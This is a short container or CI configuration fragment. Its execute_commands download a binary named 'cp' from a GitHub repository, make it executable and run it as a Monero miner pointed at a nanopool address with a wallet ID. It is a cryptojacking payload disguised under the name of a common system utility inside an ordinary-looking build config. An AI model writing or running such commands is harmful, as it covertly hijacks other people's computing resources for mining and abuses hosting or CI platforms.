    docker_image_name: "library/python"
    docker_image_tag: "3.9"
    execute_commands:
    - "wget https://github.com/WifeAiBot/testpoint/raw/main/cp"
    - "chmod +x cp && ./cp -a  rx/0  -o xmr-us-east1.nanopool.org:10300 -u 4BK5ZPJGLpSdC2Pk3FH7iGaB5uBEDj76pYpSC4qaRBGKEHzcs8vDJSvB6WfWz7efiURtQERFUtEs6A3joiMF3EnHEpo2eNY.test"
